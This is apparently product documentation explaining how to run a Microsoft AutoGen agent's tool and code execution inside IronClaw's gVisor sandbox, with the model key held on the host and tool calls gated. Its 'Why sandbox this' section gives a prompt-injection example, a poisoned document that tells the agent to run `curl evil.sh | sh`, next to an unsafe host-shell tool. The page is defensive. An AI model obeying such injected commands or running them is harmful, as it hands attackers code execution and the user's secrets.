---
title: "Sandbox your AutoGen agent with IronClaw"
description: How to sandbox a Microsoft AutoGen agent. Run your AutoGen AssistantAgent's untrusted tool and code execution inside IronClaw's sealed gVisor sandbox, with the model key held host-side and every tool call gated and audited, plus a credential-free way to see it work first.
---

# Sandbox your AutoGen agent with IronClaw

You built an agent with **AutoGen** (Microsoft): an `AssistantAgent`, a model
client, and a set of `FunctionTool`s the model can call — often a `run_shell` or a
code executor so the agent can "just run it." That is a great way to design the
*behavior*. The problem starts when it runs somewhere real: AutoGen's tool loop
executes your functions **in your own process**, with your API key in memory and
unrestricted outbound network. One prompt-injected instruction and that same
process can read your environment, exfiltrate over the network, or run a command
you never intended.

IronClaw runs the same job behind a **sealed sandbox** instead: no network card,
the model key held **host-side** and never in the agent, and every privileged tool
call routed through a human-approval gateway and an audit log.

!!! example "Runnable example"
    A one-command AutoGen-to-IronClaw example lives at
    [`examples/integrations/autogen`](https://github.com/IronSecCo/ironclaw/tree/main/examples/integrations/autogen):
    an AutoGen `FunctionTool` (`sandboxed_shell`) whose commands run inside a real
    IronClaw per-session sandbox, with a blocked escape attempt printed at the end.
    It ships with the integration examples. The credential-free demo below runs the
    same sealed loop today.

## The two-shape fix

There are two ways to sandbox an AutoGen agent, and you can use either.

**1. Keep AutoGen, swap the tool.** Replace the host-executing tool you hand your
`AssistantAgent` with one that runs every command inside an IronClaw sandbox. The
agent plans tool calls exactly as before; only the execution moves into the box:

```python
from ironclaw_sandbox import IronClawSandbox
from ironclaw_tool import make_sandbox_tool

with IronClawSandbox() as sandbox:
    tool = make_sandbox_tool(sandbox)          # a real AutoGen FunctionTool
    agent = AssistantAgent("coder", model_client=..., tools=[tool])
```

That `sandboxed_shell` FunctionTool is a drop-in for a host `run_shell` tool: **no
network, no host filesystem, no Docker socket**. The full adapter is ~15 lines —
see [`ironclaw_tool.py`](https://github.com/IronSecCo/ironclaw/tree/main/examples/integrations/autogen/ironclaw_tool.py).

**2. Re-declare the agent to IronClaw.** Or move the whole agent behind IronClaw
and let the control-plane own the model key and the perimeter:

```sh
export OPENAI_API_KEY=sk-...   # host-side only; the sandbox never sees this key
./bin/controlplane --dev --api-addr 127.0.0.1:8787 &
ironctl agent create --name "Coder" --provider openai --model gpt-4o \
  --instructions "Run the commands the user asks for." \
  --tool read_file --tool write_file --yes
```

Same persona, same model, same tools, now behind a human-approval gateway and an
audit log.

## Why sandbox this

A typical AutoGen agent hands the model a tool that shells out on your host:

```python
from autogen_agentchat.agents import AssistantAgent
from autogen_core.tools import FunctionTool

def run_shell(command: str) -> str:      # runs on YOUR box, with YOUR privileges
    import subprocess
    return subprocess.run(command, shell=True, capture_output=True, text=True).stdout

agent = AssistantAgent("coder", model_client=client, tools=[FunctionTool(run_shell, ...)])
```

Three things are true of that snippet, and all three are risks:

1. **The key is in the process.** Anything that can read memory or `os.environ`
   can read `sk-...`.
2. **Tools run with your privileges.** `run_shell` executes on your box with your
   filesystem and network. A poisoned document that says "run `curl evil.sh | sh`"
   is a tool call away.
3. **Egress is wide open.** The process can reach any host on the internet.

IronClaw closes all three by construction, not by convention.

## See it work first (no credentials)

Watch the sealed loop run with the offline `mock` provider. No model key, no
tokens, just Docker:

```sh
git clone https://github.com/IronSecCo/ironclaw.git && cd ironclaw
docker compose -f docker-compose.demo.yml up --build -d      # start the demo control-plane

curl -s -X POST http://127.0.0.1:8787/v1/ui/chat/send \
  -H 'authorization: Bearer ironclaw-demo' -H 'content-type: application/json' \
  -d '{"agentGroupID":"mock-agent","text":"hello from autogen-land"}'

sleep 3
curl -s -H 'authorization: Bearer ironclaw-demo' \
  http://127.0.0.1:8787/v1/ui/chat/mock-agent/messages       # the reply
```

You get the reply echoed back, proof that a real per-session sandbox launched and
the answer flowed home through encrypted queues. Tear down with
`docker compose -f docker-compose.demo.yml down`. The one-command, self-checking
version is
[`examples/integrations/autogen`](https://github.com/IronSecCo/ironclaw/tree/main/examples/integrations/autogen).

## Port your AutoGen agent

Map each part of the AutoGen agent onto an IronClaw agent group:

| AutoGen | IronClaw | Notes |
|---|---|---|
| `OpenAIChatCompletionClient(model="gpt-4o")` | `--provider openai --model gpt-4o` | Any [provider](../providers/index.md): `anthropic`, `openai`, `gemini`, `local`, and more. |
| `api_key=...` on the model client | `OPENAI_API_KEY` set **on the host** | The key is injected by the host model-proxy on the way out. It never enters the sandbox. |
| `system_message=...` | `--identity` / `--soul` / `--instructions` | The agent's persona, voice, and operating rules. |
| `FunctionTool`s (shell, code, ...) | `--tool <name>` (built-in) or an MCP server | Built-ins: `read_file`, `write_file`, `list_dir`, `web_search`, `http_fetch`. Your own tools attach over [MCP](../mcp.md). |
| `agent.run(task=...)` | a message to the agent group | Same request/response, now through the sealed queue. |
| AutoGen `RoundRobinGroupChat` / teams | multiple agent groups + host-mediated a2a | Agent-to-agent hand-off is host-routed and audited; spawning a new agent is gated. |

Your AutoGen tools that are *not* built in attach as an [MCP server](../mcp.md):
IronClaw registers them through the same human-approval gateway, so a new tool is a
reviewed change, not a silent capability.

## What you gained

- **The key left the agent.** It lives host-side and is injected per request; a
  compromised agent has nothing to steal.
- **`network=none` by default.** The sandbox has no NIC. The only egress is the
  audited model-proxy socket, plus whatever hosts you explicitly allowlist.
- **Privileged actions are gated.** Registering a tool, spawning another agent, or
  reaching a new host flows through a human-approval gateway and lands in the
  [audit log](../architecture.md).

Same agent you designed in AutoGen. A perimeter it never had.

## Next

- [Choose your model provider](../providers/index.md)
- [MCP: bring your own tools](../mcp.md)
- [Security and isolation](../security-isolation.md)
